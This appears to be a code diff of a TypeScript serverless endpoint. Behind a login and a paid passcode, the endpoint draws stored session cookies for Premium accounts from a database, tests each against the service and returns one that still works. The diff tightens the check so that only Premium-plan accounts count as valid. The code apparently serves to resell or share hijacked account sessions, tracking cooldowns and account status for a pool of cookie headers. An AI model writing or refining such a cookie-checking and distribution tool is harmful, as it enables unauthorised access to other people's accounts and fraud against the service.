@@ -1,5 +1,4 @@
-
-
+// api/find-account.ts – WITH PREMIUM VALIDATION
 import type { VercelRequest, VercelResponse } from "@vercel/node";
 import { ipRateLimit } from "../lib/rateLimit.js";
 import {
@@ -27,9 +26,9 @@ const originalServerHelpers = require("./original_server_helpers.cjs");
 const { getCookieHeaders, runDirectCheck } =
   originalServerHelpers.default ?? originalServerHelpers;
 
-// ============ IN-MEMORY COOLDOWN TRACKING ============
+// ============ IN-MEMORY COOLDOWN ============
 const recentlyChecked = new Map<string, number>();
-const COOLDOWN_MS = 10 * 60 * 1000; // 10 minutes
+const COOLDOWN_MS = 10 * 60 * 1000;
 
 setInterval(() => {
   const now = Date.now();
@@ -83,10 +82,7 @@ type PasscodeCheck =
       error: string;
     };
 
-async function isPasscodeValid(
-  passcode: string,
-  userId: string
-): Promise<PasscodeCheck> {
+async function isPasscodeValid(passcode: string, userId: string): Promise<PasscodeCheck> {
   const { data, error } = await supabase
     .from("passcodes")
     .select("id, code, user_id, is_active, expires_at, uses, max_uses")
@@ -108,11 +104,7 @@ async function isPasscodeValid(
     return { ok: false, error: "This passcode has expired." };
   }
 
-  if (
-    typeof data.max_uses === "number" &&
-    typeof data.uses === "number" &&
-    data.uses >= data.max_uses
-  ) {
+  if (typeof data.max_uses === "number" && typeof data.uses === "number" && data.uses >= data.max_uses) {
     return { ok: false, error: "Usage limit reached." };
   }
 
@@ -122,10 +114,7 @@ async function isPasscodeValid(
   };
 }
 
-async function incrementPasscodeUsage(
-  passcodeId: string,
-  currentUses: number | null
-) {
+async function incrementPasscodeUsage(passcodeId: string, currentUses: number | null) {
   const { error } = await supabase
     .from("passcodes")
     .update({ uses: (currentUses ?? 0) + 1 })
@@ -165,7 +154,9 @@ async function updateCookieStatus(
   };
 
   if (isValid) {
-    updateData.status = "active";
+    // ✅ Check if the account is Premium before marking as active
+    const isPremium = plan?.toLowerCase() === 'premium' || plan?.toLowerCase().includes('premium');
+    updateData.status = isPremium ? "active" : "expired";
     if (plan) updateData.plan = plan;
     if (country) updateData.country = country;
   } else {
@@ -188,20 +179,14 @@ async function updateCookieStatus(
 
 // ============ MAIN HANDLER ============
 
-export default async function handler(
-  req: VercelRequest,
-  res: VercelResponse
-) {
+export default async function handler(req: VercelRequest, res: VercelResponse) {
   const startTime = Date.now();
   console.log("🚀 find-account API called");
 
   try {
     // 1. METHOD CHECK
     if (req.method !== "POST") {
-      return res.status(405).json({
-        success: false,
-        error: "Method not allowed",
-      });
+      return res.status(405).json({ success: false, error: "Method not allowed" });
     }
 
     // 2. IP RATE LIMITING
@@ -210,38 +195,22 @@ export default async function handler(
 
     const { success: rateLimitSuccess } = await ipRateLimit.limit(ip);
     if (!rateLimitSuccess) {
-      return res.status(429).json({
-        success: false,
-        error: "Too many requests. Please slow down.",
-      });
+      return res.status(429).json({ success: false, error: "Too many requests. Please slow down." });
     }
 
     if (await isLockedOut(ip)) {
-      return res.status(429).json({
-        success: false,
-        error: "Too many failed attempts. Try again later.",
-      });
+      return res.status(429).json({ success: false, error: "Too many failed attempts. Try again later." });
     }
 
     // 3. AUTH CHECK
     const accessToken = getAccessToken(req);
     if (!accessToken) {
-      return res.status(401).json({
-        success: false,
-        error: "You must be logged in.",
-      });
+      return res.status(401).json({ success: false, error: "You must be logged in." });
     }
 
-    const {
-      data: { user },
-      error: userError,
-    } = await supabase.auth.getUser(accessToken);
-
+    const { data: { user }, error: userError } = await supabase.auth.getUser(accessToken);
     if (userError || !user) {
-      return res.status(401).json({
-        success: false,
-        error: "Invalid or expired login session.",
-      });
+      return res.status(401).json({ success: false, error: "Invalid or expired login session." });
     }
     console.log(`👤 User authenticated: ${user.email}`);
 
@@ -249,30 +218,24 @@ export default async function handler(
     const passcode = String(req.body?.passcode ?? "").trim();
     if (!passcode) {
       await recordFailure(ip);
-      return res.status(400).json({
-        success: false,
-        error: "Passcode is required.",
-      });
+      return res.status(400).json({ success: false, error: "Passcode is required." });
     }
 
     const passcodeCheck = await isPasscodeValid(passcode, user.id);
     if (!passcodeCheck.ok) {
       await recordFailure(ip);
-      return res.status(401).json({
-        success: false,
-        error: passcodeCheck.error,
-      });
+      return res.status(401).json({ success: false, error: passcodeCheck.error });
     }
     console.log("✅ Passcode validated");
 
-    // 5. FETCH ALL PREMIUM COOKIES – INCLUDING UNKNOWN STATUS
-    console.log("🔍 Fetching Premium cookies from checked_cookies...");
+    // 5. FETCH ONLY PREMIUM COOKIES
+    console.log("🔍 Fetching ONLY Premium cookies from checked_cookies...");
 
     const { data: allCookies, error: cookieError } = await supabase
       .from("checked_cookies")
       .select("id, cookie_header, plan, country, status")
-      .eq("plan", "Premium")
-      .or('status.eq.unknown,status.is.null,status.eq.active,status.eq.')
+      .eq("plan", "Premium")  // ✅ ONLY PREMIUM
+      .or('status.eq.unknown,status.is.null,status.eq.active')
       .not("cookie_header", "is", null)
       .not("cookie_header", "eq", "");
 
@@ -295,14 +258,14 @@ export default async function handler(
       });
     }
 
-    // 6. FILTER OUT COOKIES IN COOLDOWN AND SHUFFLE
+    // 6. FILTER OUT COOKIES IN COOLDOWN
     const now = Date.now();
     const availableCookies = allCookies.filter((row: any) => {
       const lastChecked = recentlyChecked.get(row.id);
       if (lastChecked) {
         const timeSince = now - lastChecked;
         if (timeSince < COOLDOWN_MS) {
-          console.log(`⏳ Skipping cookie ${row.id} - in cooldown (${Math.round(timeSince / 1000)}s ago)`);
+          console.log(`⏳ Skipping cookie ${row.id} - in cooldown`);
           return false;
         }
       }
@@ -315,31 +278,26 @@ export default async function handler(
       return res.status(404).json({
         success: false,
         error: "All Premium cookies are in cooldown. Please wait 10 minutes.",
-        debug: {
-          cooldownMinutes: 10,
-          totalCookies: allCookies.length,
-          nextAvailableIn: "10 minutes",
-        },
+        debug: { cooldownMinutes: 10, totalCookies: allCookies.length },
       });
     }
 
-    // 7. SHUFFLE FOR TRUE RANDOMNESS
-    console.log("🔀 Shuffling cookies for random order...");
+    // 7. SHUFFLE FOR RANDOMNESS
+    console.log("🔀 Shuffling cookies...");
     for (let i = availableCookies.length - 1; i > 0; i--) {
       const j = Math.floor(Math.random() * (i + 1));
       [availableCookies[i], availableCookies[j]] = [availableCookies[j], availableCookies[i]];
     }
 
-    console.log(`🎯 Will check ALL ${availableCookies.length} cookies until valid one is found`);
+    console.log(`🎯 Will check ALL ${availableCookies.length} Premium cookies until valid one is found`);
 
-    // 8. CHECK COOKIES ONE BY ONE – UNTIL VALID FOUND
+    // 8. CHECK COOKIES ONE BY ONE
     let checkedCount = 0;
 
     for (const item of availableCookies) {
       checkedCount++;
-      console.log(`🔍 Checking cookie ${checkedCount}/${availableCookies.length} (ID: ${item.id})`);
+      console.log(`🔍 Checking Premium cookie ${checkedCount}/${availableCookies.length} (ID: ${item.id})`);
 
-      // Mark as checked for cooldown
       recentlyChecked.set(item.id, now);
 
       try {
@@ -356,22 +314,24 @@ export default async function handler(
         const results = Array.isArray(result?.results) ? result.results : [];
         const valid = results.find((r: any) => r?.valid);
 
-        // Update database status
-        await updateCookieStatus(
-          item.id,
-          !!valid,
-          valid?.plan || item.plan || "Premium",
-          valid?.countryOfSignup || item.country || null,
-          false // No network error
-        );
-
+        // ✅ CRITICAL FIX: Only accept if the account is actually Premium
         if (valid) {
+          const isPremium = valid?.plan?.toLowerCase() === 'premium' || 
+                            valid?.plan?.toLowerCase().includes('premium') ||
+                            valid?.tier?.toLowerCase() === 'premium';
+
+          if (!isPremium) {
+            console.log(`❌ Account found but NOT Premium (${valid?.plan}), marking as expired...`);
+            await updateCookieStatus(item.id, false, valid?.plan || item.plan || "Standard", valid?.countryOfSignup || item.country || null);
+            continue; // Skip this cookie and continue checking
+          }
+
+          // ✅ VALID PREMIUM ACCOUNT FOUND
           await savePassedCheckAudits(results);
-          console.log(`✅✅✅ VALID Premium cookie FOUND after checking ${checkedCount} cookies!`);
-          await incrementPasscodeUsage(
-            passcodeCheck.passcodeRow.id,
-            passcodeCheck.passcodeRow.uses
-          );
+          await updateCookieStatus(item.id, true, valid?.plan || "Premium", valid?.countryOfSignup || item.country || null);
+          
+          console.log(`✅✅✅ VALID PREMIUM cookie FOUND after checking ${checkedCount} cookies!`);
+          await incrementPasscodeUsage(passcodeCheck.passcodeRow.id, passcodeCheck.passcodeRow.uses);
           await clearFailures(ip);
 
           const responseTime = Date.now() - startTime;
@@ -389,21 +349,15 @@ export default async function handler(
           });
         } else {
           console.log(`❌ Cookie ${checkedCount} invalid or expired`);
+          await updateCookieStatus(item.id, false, item.plan || "Premium", item.country || null);
         }
       } catch (checkError: any) {
         console.error(`⚠️ Error checking cookie ${item.id}:`, checkError.message);
-        // ✅ Keep as unknown on network errors
-        await updateCookieStatus(
-          item.id,
-          false,
-          item.plan || "Premium",
-          item.country || null,
-          true // Network error – keep as unknown
-        );
+        await updateCookieStatus(item.id, false, item.plan || "Premium", item.country || null, true);
       }
     }
 
-    // 9. NO VALID COOKIES FOUND – Checked ALL available cookies
+    // 9. NO VALID COOKIES FOUND
     console.log(`❌❌❌ NO valid Premium cookies found after checking ALL ${checkedCount} available cookies`);
 
     return res.status(404).json({
@@ -414,7 +368,6 @@ export default async function handler(
         totalAvailable: availableCookies.length,
         totalInPool: allCookies.length,
         cooldownMinutes: 10,
-        message: "All available cookies have been checked. Please try again later.",
       },
     });
   } catch (error: any) {
